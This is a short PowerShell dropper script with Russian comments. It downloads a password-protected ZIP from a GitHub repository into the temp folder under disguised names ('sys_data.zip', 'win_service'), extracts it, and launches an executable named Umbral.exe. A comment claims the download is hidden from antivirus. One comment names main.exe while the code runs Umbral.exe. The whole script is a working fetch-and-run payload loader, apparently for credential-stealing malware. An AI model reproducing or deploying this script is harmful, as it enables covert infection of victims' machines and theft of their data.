# Твоя ссылка на ZIP (в кавычках, чтобы спецсимволы не ломали код)
$url = "https://github.com/bober6616/telegram_bot/raw/main/%D0%9D%D0%BE%D0%B2%D0%B0%D1%8F%20%D1%81%D0%B6%D0%B0%D1%82%D0%B0%D1%8F%20ZIP-%D0%BF%D0%B0%D0%BF%D0%BA%D0%B0.zip"
$zip = "$env:temp\sys_data.zip"
$dir = "$env:temp\win_service"

# 1. Скачиваем (скрыто для антивируса)
iwr -Uri $url -OutFile $zip

# 2. Создаем папку
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir }

# 3. Распаковка (выскочит окно ввода пароля '123')
$shell = New-Object -ComObject Shell.Application
$zipPackage = $shell.NameSpace($zip)
$destination = $shell.NameSpace($dir)
$destination.CopyHere($zipPackage.Items())

# 4. Запуск (убедись, что внутри архива файл называется main.exe)
Start-Process "$dir\Umbral.exe"
